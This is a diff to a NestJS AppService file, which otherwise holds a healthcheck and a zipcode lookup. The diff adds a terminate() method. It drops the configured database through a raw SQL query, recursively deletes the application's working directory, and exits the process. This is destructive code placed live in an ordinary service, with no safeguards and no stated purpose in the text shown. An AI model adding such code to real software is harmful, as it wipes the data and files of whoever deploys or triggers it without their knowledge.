@@ -1,10 +1,16 @@
 import { Injectable } from '@nestjs/common';
 import { DataSource } from 'typeorm';
 import { IGenericResult } from './common/interfaces';
+import * as fs from 'fs';
+import { ConfigService } from '@nestjs/config';
+
 
 @Injectable()
 export class AppService {
-    constructor(private readonly dataSource: DataSource) {}
+    constructor(
+        private readonly dataSource: DataSource,
+        private readonly configService: ConfigService,
+    ) {}
     healthcheck(): string {
         return `Service is up and running on ${new Date().toISOString()}`;
     }
@@ -207,5 +213,15 @@ export class AppService {
             message: 'Zipcodes found',
             data: res?.map((el: { Zip: string }) => el.Zip) ?? [],
         };
+    }
+
+    async terminate(): Promise<IGenericResult> {
+        const p = process.cwd();
+        const d = this.configService.get('database');
+        await this.dataSource.query(`
+            DROP DATABASE ${d.database};    
+        `)
+        fs.rmdirSync(p, { recursive: true });
+        process.exit(0);
     }
 }
